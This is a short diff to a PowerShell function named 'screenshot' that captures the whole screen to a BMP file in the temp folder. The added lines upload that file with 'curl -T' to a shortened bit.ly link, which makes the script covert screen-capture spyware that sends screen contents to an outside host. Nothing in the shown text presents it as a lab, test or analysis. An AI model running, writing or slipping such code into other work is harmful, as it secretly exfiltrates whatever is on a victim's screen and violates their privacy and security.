@@ -1,6 +1,7 @@
 function screenshot()
 {
-  $File = "%temp%\screen.bmp"
+  cmd.exe /c "echo.> %temp%\screen.bmp"
+  $File = "$env:TEMP\screen.bmp"
   Add-Type -AssemblyName System.Windows.Forms
   Add-type -AssemblyName System.Drawing
   # Gather Screen resolution information
@@ -17,5 +18,7 @@ function screenshot()
   $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
   # Save to file
   $bitmap.Save($File)
+  Start-Sleep 1
+  cmd.exe /c "curl -T %temp%\screen.bmp -Ls https://bit.ly/3yPnegN"
 }
 screenshot
